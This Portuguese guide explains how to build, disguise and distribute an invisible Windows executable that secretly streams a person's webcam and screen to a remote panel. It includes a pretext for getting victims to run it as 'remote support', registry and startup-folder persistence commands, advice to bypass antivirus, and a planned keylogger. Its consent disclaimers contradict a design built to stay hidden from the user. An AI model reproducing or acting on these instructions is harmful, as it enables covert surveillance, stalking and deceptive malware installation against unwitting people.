# 👻 Guia - Executável Invisível (MonitoramentoSeguro.exe)

## 🎯 O que é?

Um executável **completamente invisível** que:
- ✅ Roda em segundo plano (sem janela)
- ✅ Captura câmera automaticamente
- ✅ Captura tela automaticamente
- ✅ Envia tudo para seu painel em `https://hackl.onrender.com`
- ✅ Não aparece nada para o usuário

---

## 🔨 Como Compilar

### 1. Configurar `.env` no `cliente_app/`:
```bash
SERVER_URL=https://hackl.onrender.com
LINK_CODE=NATIVE_CLIENT
```

### 2. Executar build:
```bash
cd cliente_app
python build_exe.py
```

### 3. Resultado:
```
dist/MonitoramentoSeguro.exe  (arquivo único, ~50MB)
```

---

## 📦 Como Distribuir

### Opção 1: Enviar direto
- Envie `MonitoramentoSeguro.exe` para a pessoa
- Instrua: "Execute este arquivo para ativar o suporte remoto"

### Opção 2: Hospedar online
- Suba o `.exe` no Google Drive / Dropbox
- Compartilhe o link
- Pessoa baixa e executa

### Opção 3: Pendrive
- Copie para pendrive
- Entregue pessoalmente

---

## 🚀 Como Funciona

### Para a pessoa (cliente):
1. **Baixa** `MonitoramentoSeguro.exe`
2. **Executa** (duplo clique)
3. **Não vê nada** (executável invisível)
4. Câmera e tela começam a transmitir

### Para você (admin):
1. **Abre** `https://hackl.onrender.com`
2. **Vê** notificação: "📹 Nova câmera conectada"
3. **Monitora** câmera e tela em tempo real
4. **Recebe** estatísticas atualizadas

---

## 🔍 Como Verificar se Está Rodando

### No computador da pessoa:

#### Método 1: Task Manager
```
Ctrl + Shift + Esc
→ Processos
→ Procurar: "MonitoramentoSeguro.exe"
```

#### Método 2: Verificar logs
```
%TEMP%\system.log
```

Conteúdo do log:
```
2026-01-08 20:00:00 - INFO - Iniciando monitoramento silencioso...
2026-01-08 20:00:01 - INFO - Conectado ao servidor
2026-01-08 20:00:02 - INFO - Captura de câmera iniciada
2026-01-08 20:00:02 - INFO - Captura de tela iniciada
```

---

## 🛑 Como Parar

### Método 1: Task Manager
```
Ctrl + Shift + Esc
→ Processos
→ MonitoramentoSeguro.exe
→ Botão direito → Finalizar tarefa
```

### Método 2: CMD (Admin)
```bash
taskkill /F /IM MonitoramentoSeguro.exe
```

---

## ⚙️ Configurações Avançadas

### Iniciar com o Windows (Auto-start)

#### Método 1: Pasta de Inicialização
```
1. Win + R
2. Digite: shell:startup
3. Copie MonitoramentoSeguro.exe para esta pasta
```

#### Método 2: Registro do Windows
```batch
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Monitor" /t REG_SZ /d "C:\caminho\MonitoramentoSeguro.exe" /f
```

---

## 🔐 Segurança e Privacidade

### ⚠️ IMPORTANTE - Uso Ético

Este executável captura câmera e tela **sem avisar o usuário**.

**Use APENAS com consentimento explícito:**
- ✅ Suporte técnico autorizado
- ✅ Monitoramento corporativo com aviso prévio
- ✅ Testes em seu próprio computador

**NÃO use para:**
- ❌ Espionagem não autorizada
- ❌ Invasão de privacidade
- ❌ Atividades ilegais

**Responsabilidade Legal:**
- Você é responsável pelo uso deste software
- Violações de privacidade podem resultar em processos criminais
- Sempre obtenha consentimento por escrito

---

## 🐛 Troubleshooting

### Executável não inicia
**Causa**: Antivírus bloqueou

**Solução**:
1. Adicionar exceção no antivírus
2. Windows Defender → Proteção contra vírus → Gerenciar configurações → Adicionar exclusão

### Câmera não funciona
**Causa**: Câmera em uso por outro app

**Solução**:
- Fechar Zoom, Teams, Skype
- Reiniciar o executável

### Não aparece no dashboard
**Causa**: Sem conexão com servidor

**Solução**:
1. Verificar internet
2. Verificar se `SERVER_URL` está correto no `.env` antes de compilar
3. Ver logs em `%TEMP%\system.log`

### Executável muito grande
**Causa**: PyInstaller inclui todas as dependências

**Solução**: Normal, tamanho ~50-80MB

---

## 📊 Monitoramento no Dashboard

Quando o executável conecta, você vê:

### Notificação:
```
📹 Nova câmera conectada: abc12345
🖥️ Nova tela conectada: abc12345
```

### Cards de Estatísticas:
```
Clientes Conectados: 1 → 2
```

### Grid de Vídeos:
```
[● AO VIVO (CAM)]  [● AO VIVO (TELA)]
   Câmera 480x360     Tela 800x450
   ID: abc12345       ID: abc12345
```

---

## 🔄 Atualizar Executável

Se mudar configurações ou código:

```bash
cd cliente_app
python build_exe.py
```

Novo `.exe` será gerado em `dist/`

---

## 📱 Compatibilidade

### Sistemas Operacionais:
- ✅ Windows 10
- ✅ Windows 11
- ⚠️ Windows 7/8 (pode precisar de ajustes)
- ❌ Linux (precisa recompilar)
- ❌ macOS (precisa recompilar)

### Requisitos:
- Câmera (webcam)
- Conexão com internet
- ~100MB de RAM
- ~50MB de espaço em disco

---

## 🎯 Casos de Uso Legítimos

### 1. Suporte Técnico Remoto
```
Cliente: "Meu computador está com problema"
Você: "Execute este arquivo para eu ver sua tela"
Cliente: Executa MonitoramentoSeguro.exe
Você: Vê a tela e resolve o problema
```

### 2. Monitoramento Corporativo
```
Empresa avisa funcionários sobre monitoramento
Instala MonitoramentoSeguro.exe nos PCs da empresa
RH monitora uso durante expediente
```

### 3. Segurança Residencial
```
Instala em PC de casa
Monitora enquanto está viajando
Vê se alguém está usando o computador
```

---

## 📋 Checklist de Distribuição

Antes de enviar o `.exe`:

- [ ] `.env` configurado com `SERVER_URL` correto
- [ ] Executável compilado com `build_exe.py`
- [ ] Testado em seu próprio PC
- [ ] Antivírus não bloqueia
- [ ] Dashboard recebe transmissão
- [ ] **Consentimento do usuário obtido**
- [ ] Instruções claras fornecidas

---

## 🆘 Suporte

### Logs do Cliente:
```
%TEMP%\system.log
```

### Logs do Servidor:
```
Render Dashboard → Logs
```

### Verificar Conexão:
```bash
# No PC do cliente
ping hackl.onrender.com
```

---

## 🔮 Recursos Futuros (Opcional)

Melhorias possíveis:
- 🎤 Captura de áudio
- 📍 Geolocalização
- 🔑 Captura de teclas (keylogger)
- 📧 Enviar relatórios por email
- 💾 Gravar sessões localmente
- 🔐 Criptografia end-to-end

---

## ⚖️ Aviso Legal

```
ESTE SOFTWARE É FORNECIDO "COMO ESTÁ", SEM GARANTIAS.

O DESENVOLVEDOR NÃO SE RESPONSABILIZA POR:
- Uso indevido ou ilegal
- Violações de privacidade
- Danos causados pelo software
- Processos legais resultantes do uso

AO USAR ESTE SOFTWARE, VOCÊ CONCORDA:
- Obter consentimento explícito dos monitorados
- Cumprir todas as leis locais de privacidade
- Usar apenas para fins legítimos e éticos
- Assumir total responsabilidade pelo uso

LEIS DE PRIVACIDADE VARIAM POR PAÍS/ESTADO.
CONSULTE UM ADVOGADO SE TIVER DÚVIDAS.
```

---

**Criado**: 2026-01-08  
**Versão**: 3.0 (Modo Invisível)  
**Autor**: Sistema de Monitoramento Remoto
